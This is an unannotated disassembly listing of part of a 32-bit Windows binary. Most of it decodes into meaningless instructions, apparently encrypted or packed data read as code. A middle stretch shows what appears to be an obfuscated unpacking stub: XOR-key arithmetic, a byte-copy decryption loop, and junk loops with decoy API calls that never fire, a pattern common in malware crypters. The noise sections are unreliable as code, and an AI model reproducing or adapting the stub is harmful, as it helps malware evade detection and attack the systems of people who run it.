  403a3c:	ror    DWORD PTR [ebp+0x71],0xfe
  403a40:	xchg   ebx,eax
  403a41:	mov    eax,0xe2278934
  403a46:	adc    eax,0xb800aafa
  403a4b:	lods   eax,DWORD PTR ds:[esi]
  403a4c:	(bad)  
  403a4d:	mov    DWORD PTR [edx-0x77],0xaa1063b2
  403a54:	mov    DWORD PTR [ebx],ebp
  403a56:	mov    ch,0x3c
  403a58:	(bad)  
  403a5a:	pop    ecx
  403a5b:	gs xchg ebp,eax
  403a5d:	dec    ebx
  403a5e:	shl    BYTE PTR [edi+ebp*2-0x5a],cl
  403a62:	inc    BYTE PTR ds:0x3facb481
  403a68:	xor    DWORD PTR [esi-0x46d563fd],0x59
  403a6f:	out    0x45,eax
  403a71:	jle    0x403ab5
  403a73:	in     eax,0xe1
  403a75:	mov    ch,0x1f
  403a77:	scas   al,BYTE PTR es:[edi]
  403a78:	call   0xbc04:0x24433f66
  403a7f:	lea    ebp,[ecx]
  403a81:	pop    edx
  403a82:	push   es
  403a83:	mov    edx,0x8efcd20
  403a88:	shl    BYTE PTR [eax-0x29],0xc
  403a8c:	sub    cl,cl
  403a8e:	popf   
  403a8f:	stos   BYTE PTR es:[edi],al
  403a90:	xchg   ebp,eax
  403a91:	fsubr  DWORD PTR [esi+0x6493a441]
  403a97:	pop    es
  403a98:	pusha  
  403a99:	fild   QWORD PTR [edx]
  403a9b:	int3   
  403a9c:	ror    DWORD PTR [ebp+edi*8+0x2af89eb5],0xf3
  403aa4:	cmp    dh,cl
  403aa6:	xchg   edx,eax
  403aa7:	dec    edx
  403aa8:	mov    bh,dh
  403aaa:	xchg   esp,eax
  403aab:	sbb    dl,BYTE PTR [eax-0x465dd2db]
  403ab1:	sahf   
  403ab2:	push   esp
  403ab3:	fwait
  403ab4:	cmp    BYTE PTR [ecx],dh
  403ab6:	sub    eax,0x5df45af4
  403abb:	mov    ecx,DWORD PTR [ecx+0x3c61871f]
  403ac1:	sbb    edi,DWORD PTR [ebp+0x51b68e48]
  403ac7:	sbb    BYTE PTR [esi],dl
  403ac9:	cmp    eax,0xcfaea5c1
  403ace:	fsubr  DWORD PTR [eax+0x7e2b5bc6]
  403ad4:	add    ecx,edi
  403ad6:	out    0x82,eax
  403ad8:	jne    0x403b24
  403ada:	sar    BYTE PTR [esi+eiz*2+0x530c3405],1
  403ae1:	cdq    
  403ae2:	lods   al,BYTE PTR ds:[esi]
  403ae3:	int    0xec
  403ae5:	pop    edx
  403ae6:	mov    esi,0x551a1be8
  403aeb:	xchg   edx,eax
  403aec:	pop    es
  403aed:	jle    0x403b66
  403aef:	les    ecx,FWORD PTR [edx-0x35e3a177]
  403af5:	jns    0x403af6
  403af7:	sub    ebp,DWORD PTR [esi]
  403af9:	mov    bh,0x6d
  403afb:	and    DWORD PTR [edi],esi
  403afd:	sbb    eax,0xdbe42199
  403b02:	les    edi,FWORD PTR [edi-0x10]
  403b05:	jae    0x403b13
  403b07:	xchg   ebx,eax
  403b08:	neg    BYTE PTR [edi]
  403b0a:	int    0x55
  403b0c:	sahf   
  403b0d:	xchg   edx,eax
  403b0e:	mov    ebp,esp
  403b10:	popf   
  403b11:	cld    
  403b12:	pop    esp
  403b13:	jmp    0x77bd:0x81b2d84
  403b1a:	add    dl,BYTE PTR [eax-0x78]
  403b1d:	mov    esi,0xecc9f499
  403b22:	mov    esi,0xcb37d50c
  403b27:	sbb    al,0x99
  403b29:	dec    ebx
  403b2a:	das    
  403b2b:	icebp  
  403b2c:	popa   
  403b2d:	int3   
  403b2e:	xchg   ebp,eax
  403b2f:	retf   
  403b30:	mov    edx,0xfe0cac9c
  403b35:	mov    DWORD PTR ds:0x940fed7c,0xaa5f9a36
  403b3f:	and    edx,eax
  403b41:	and    al,0x5b
  403b43:	push   esi
  403b44:	mov    dl,BYTE PTR [ecx]
  403b46:	jmp    0x403b8d
  403b48:	aaa    
  403b49:	lea    esi,[edx-0x6a]
  403b4c:	pusha  
  403b4d:	jo     0x403b94
  403b4f:	cs jecxz 0x403bcc
  403b52:	xlat   BYTE PTR ds:[ebx]
  403b53:	cwde   
  403b54:	arpl   WORD PTR [eax],ax
  403b56:	stos   BYTE PTR es:[edi],al
  403b57:	fs mov cl,0xa6
  403b5a:	stos   DWORD PTR es:[edi],eax
  403b5b:	cli    
  403b5c:	push   ebx
  403b5d:	push   ebp
  403b5e:	jl     0x403b7b
  403b60:	repnz xor eax,0x7b721d86
  403b66:	sbb    eax,DWORD PTR [edx+0xc]
  403b69:	xor    esp,eax
  403b6b:	rol    DWORD PTR [ecx-0x60],0x36
  403b6f:	into   
  403b70:	cwde   
  403b71:	cmp    BYTE PTR [ebp+eax*1+0x288b0276],dh
  403b78:	leave  
  403b79:	jb     0x403b9c
  403b7b:	jne    0x403b85
  403b7d:	jno    0x403b45
  403b7f:	push   ecx
  403b80:	sbb    eax,ebx
  403b82:	sar    BYTE PTR [ebx],0x5f
  403b85:	xchg   edx,eax
  403b86:	fxch   st(7)
  403b88:	add    eax,0xe2d80383
  403b8d:	cmp    al,0x88
  403b8f:	lahf   
  403b90:	not    ebp
  403b92:	jmp    0xa944bc57
  403b97:	mov    cs,WORD PTR [edi+eiz*4-0x37]
  403b9b:	fild   QWORD PTR [ebx+0x4aab646c]
  403ba1:	sub    eax,0x1b3b9455
  403ba6:	adc    al,0x1a
  403ba8:	lds    edx,FWORD PTR [ebx]
  403baa:	cdq    
  403bab:	dec    ebp
  403bac:	pop    DWORD PTR [ecx+ebx*4]
  403baf:	fs add eax,0x62d467b8
  403bb5:	xlat   BYTE PTR ds:[ebx]
  403bb6:	aam    0xc6
  403bb8:	pop    edi
  403bb9:	mov    ecx,0xc8668bec
  403bbe:	es adc al,0x21
  403bc1:	shl    BYTE PTR ss:[esi-0x4c842f21],1
  403bc8:	mov    esp,0x5e9cf1fe
  403bcd:	idiv   ch
  403bcf:	add    BYTE PTR [eax],cl
  403bd1:	cmp    edx,edi
  403bd3:	(bad)  
  403bd5:	adc    BYTE PTR [esi-0x777ddf97],0x79
  403bdc:	add    al,0xb2
  403bde:	push   0x994826ee
  403be3:	and    eax,0x56b101b6
  403be8:	mov    ds:0xfc218549,eax
  403bed:	cmp    dh,BYTE PTR [ecx]
  403bef:	mov    esi,0xe4518ba9
  403bf4:	push   esp
  403bf5:	in     al,0x51
  403bf7:	sbb    eax,0x3c360d5a
  403bfc:	xor    dh,BYTE PTR [edi]
  403bfe:	or     BYTE PTR [ebp+0x5f],bl
  403c01:	hlt    
  403c02:	pop    esp
  403c03:	sbb    eax,DWORD PTR [ebx-0x2a]
  403c06:	or     DWORD PTR [ebx+ebx*4+0x71dfee57],edi
  403c0d:	jmp    0x403c46
  403c0f:	cmc    
  403c10:	jno    0x403c40
  403c12:	xchg   ecx,eax
  403c13:	lea    eax,[edi-0x327c026e]
  403c19:	push   es
  403c1a:	pop    esi
  403c1b:	xchg   edi,eax
  403c1c:	pop    ebx
  403c1d:	jg     0x403c83
  403c1f:	sbb    ah,0xfc
  403c22:	pop    ecx
  403c23:	ret    
  403c24:	stos   DWORD PTR es:[edi],eax
  403c25:	or     eax,esi
  403c27:	xor    BYTE PTR [esi],cl
  403c29:	sti    
  403c2a:	push   esp
  403c2b:	xchg   edi,eax
  403c2c:	push   esi
  403c2d:	cmc    
  403c2e:	scas   al,BYTE PTR es:[edi]
  403c2f:	imul   ebx,DWORD PTR gs:[eax-0x30c587cc],0xddccc5e9
  403c3a:	xor    ah,al
  403c3c:	xor    ebx,DWORD PTR [edx]
  403c3e:	fisubr WORD PTR [edi-0x1db4c27e]
  403c44:	pushf  
  403c45:	sbb    BYTE PTR ds:0xbf92dfda,bh
  403c4b:	mov    edx,0xfdb947cf
  403c50:	push   esp
  403c51:	dec    ebx
  403c52:	cdq    
  403c53:	cld    
  403c54:	adc    DWORD PTR [ecx],ebx
  403c56:	push   0xcb292df7
  403c5b:	jp     0x403c54
  403c5d:	xchg   ecx,eax
  403c5e:	pop    ebx
  403c5f:	loopne 0x403c68
  403c61:	imul   ebx,DWORD PTR [edx+0x73b0653f],0x7464671b
  403c6b:	sbb    eax,0x6fa14651
  403c70:	shr    esp,cl
  403c72:	xchg   dl,bl
  403c74:	ror    BYTE PTR [eax+0x49],1
  403c77:	mov    ebp,0x6ea19b15
  403c7c:	leave  
  403c7d:	pop    edx
  403c7e:	xor    BYTE PTR [ebx+esi*1-0x38],al
  403c82:	mov    DWORD PTR [ebp+0x8],ecx
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d56c,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41fecf
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x1a9c947b
  4042a6:	jae    0x40423a
  4042a8:	jbe    0x4042c4
  4042aa:	pop    edi
  4042ab:	bound  esp,QWORD PTR [edx+0x2a]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x29]
  4042b2:	mov    eax,ds:0xadc959e9
  4042b7:	xchg   ebx,eax
  4042b8:	dec    ebx
  4042b9:	repnz leave 
  4042bb:	dec    ecx
  4042bc:	dec    ebx
  4042bd:	shr    edi,1
  4042bf:	dec    ecx
  4042c0:	stc    
  4042c1:	push   0x4c
  4042c3:	mov    es,WORD PTR [ecx+ebx*4+0x16]
  4042c7:	stos   DWORD PTR es:[edi],eax
  4042c8:	xchg   ebp,eax
  4042c9:	repz mov eax,ds:0x35ed0764
  4042cf:	scas   al,BYTE PTR es:[edi]
  4042d0:	test   DWORD PTR [esi-0x23ac9e19],0xb0367819
  4042da:	sub    al,0x8f
  4042dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042dd:	mov    edx,eax
  4042df:	fild   WORD PTR [ebp+0x64]
  4042e2:	call   0x712069c8
  4042e7:	sbb    BYTE PTR [edx+edi*1-0x6f008c66],0x29
  4042ef:	xchg   edx,eax
  4042f0:	mov    ecx,0xf850f2cd
  4042f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042f6:	inc    ebx
  4042f7:	enter  0x17cb,0x48
  4042fb:	fld    DWORD PTR [eax-0x3c]
  4042fe:	retf   
  4042ff:	cmp    eax,DWORD PTR [edi-0x1]
  404302:	in     al,dx
  404303:	enter  0x4fcb,0x39
  404307:	jge    0x404297
  404309:	or     dh,0x34
  40430c:	fs aaa 
  40430e:	xor    al,0xa
  404310:	call   0x821e:0x625c6afb
  404317:	fiadd  DWORD PTR [edx-0x27]
  40431a:	sbb    BYTE PTR [eax],bh
  40431c:	pusha  
  40431d:	mov    eax,ds:0x1e1ad5c
  404322:	cmp    DWORD PTR [ebx-0xe],ecx
  404325:	mov    bh,0x4c
  404327:	jb     0x404328
  404329:	pop    eax
  40432a:	dec    ebp
  40432b:	jne    0x4042f4
  40432d:	xchg   edx,eax
  40432e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40432f:	xchg   ebp,eax
  404330:	xor    dl,BYTE PTR [ebx-0x41]
  404333:	mov    esp,0x2e41bff0
  404338:	cld    
  404339:	add    eax,ecx
  40433b:	jmp    0xc9fc:0xa775e3b6
  404342:	jle    0x4042f3
  404344:	jno    0x4043a6
  404346:	xchg   ebx,eax
  404347:	inc    ebp
  404348:	scas   al,BYTE PTR es:[edi]
  404349:	retf   
  40434a:	sub    BYTE PTR [ebx],bh
  40434c:	ss pop edx
  40434e:	neg    DWORD PTR [eax-0x26b7e09]
  404354:	dec    eax
  404355:	dec    eax
  404356:	in     eax,dx
  404357:	cld    
  404358:	and    BYTE PTR [esi],cl
  40435a:	jmp    0x47d:0xbf405ee6
  404361:	nop
  404362:	push   ds
  404363:	pop    ss
  404364:	in     eax,0xc9
  404366:	jmp    ebp
  404368:	test   DWORD PTR [esi+esi*2+0x1c154f83],eax
  40436f:	sub    BYTE PTR [edi-0x61],dl
  404372:	idiv   DWORD PTR [ebx+0xd]
  404375:	mov    cl,0xa2
  404377:	dec    ebx
  404378:	ret    
  404379:	loop   0x4043ef
  40437b:	jbe    0x4043a7
  40437d:	xor    al,0x6
  40437f:	xchg   esp,eax
  404380:	(bad)  
  404381:	sub    edx,DWORD PTR [ebx+0x3a]
  404384:	(bad)  
  404385:	outs   dx,BYTE PTR ds:[esi]
  404386:	inc    ebx
  404387:	jno    0x40438e
  404389:	push   cs
  40438a:	push   ebp
  40438b:	mov    edi,0x9b306f69
  404390:	cdq    
  404391:	lds    esi,FWORD PTR [ecx]
  404393:	or     esi,esp
  404395:	(bad)  
  404396:	jmp    0x404381
  404398:	mov    esi,0xbc53235
  40439d:	fistp  QWORD PTR [ebx]
  40439f:	and    edx,DWORD PTR [edx+0x50]
  4043a2:	mov    al,0x64
  4043a4:	mov    ah,0x8d
  4043a6:	mov    ss,WORD PTR [esp+eax*2+0x42]
  4043aa:	sub    edi,ecx
  4043ac:	mov    WORD PTR [esi+0x3b],cs
  4043af:	int    0x14
  4043b1:	jb     0x404403
  4043b3:	cmp    dh,BYTE PTR [edi]
  4043b5:	ins    DWORD PTR es:[edi],dx
  4043b6:	inc    edi
  4043b7:	dec    edi
  4043b8:	dec    edi
  4043b9:	dec    ebx
  4043ba:	pop    ebp
  4043bb:	loopne 0x40435b
  4043bd:	mov    DWORD PTR [ebp+0x3e],ecx
  4043c0:	mov    ds:0xb2f5bc77,al
  4043c5:	(bad)  
  4043c6:	int3   
  4043c7:	xchg   DWORD PTR ds:0x2b6f4dc8,ebp
  4043cd:	add    cl,BYTE PTR [eax+0x6a2a5618]
  4043d3:	adc    ah,BYTE PTR [ecx+0x59]
  4043d6:	inc    esi
  4043d7:	mov    ds:0x5eb79ba5,eax
  4043dc:	test   BYTE PTR [edi+0xb419f98],bh
  4043e2:	ret    
  4043e3:	mov    esp,0xbea3b4ba
  4043e8:	jmp    0xc965:0x20fae422
  4043ef:	test   DWORD PTR [edi-0x73b57a5e],edi
  4043f5:	dec    ebx
  4043f6:	xchg   esp,eax
  4043f7:	mov    esp,0x5941ee23
  4043fc:	mov    bl,0xeb
  4043fe:	and    eax,0xb9d8be72
  404403:	and    eax,0x193400ba
  404408:	add    ebp,DWORD PTR [ecx+edi*4-0x31]
  40440c:	dec    ebp
  40440d:	sub    DWORD PTR [eax-0x6fc5f4c6],ebp
  404413:	pushf  
  404414:	sub    BYTE PTR [ebx-0xe],al
  404417:	xor    edi,DWORD PTR [eax]
  404419:	inc    ebx
  40441a:	(bad)  
  40441b:	mov    ebx,DWORD PTR [ebx-0x4a41d036]
  404421:	or     esi,edx
  404423:	or     al,0x26
  404425:	jnp    0x404474
  404427:	add    BYTE PTR [ebp+0x24825046],al
  40442d:	sbb    DWORD PTR [ebp+0x27a700a4],ebx
  404433:	or     eax,0xedb90d39
  404438:	jns    0x40443d
  40443a:	pop    ebp
  40443b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40443c:	stc    
  40443d:	(bad)  
  40443e:	dec    esp
  40443f:	scas   al,BYTE PTR es:[edi]
  404440:	fwait
  404441:	(bad)  
  404442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404443:	mov    ecx,0xfe031225
  404448:	cmc    
  404449:	nop
  40444a:	test   DWORD PTR [esi-0x3f],0xf3d73b93
  404451:	inc    esi
  404452:	imul   ebp,edx,0xffffffdc
  404455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404456:	mov    eax,0x16dd1264
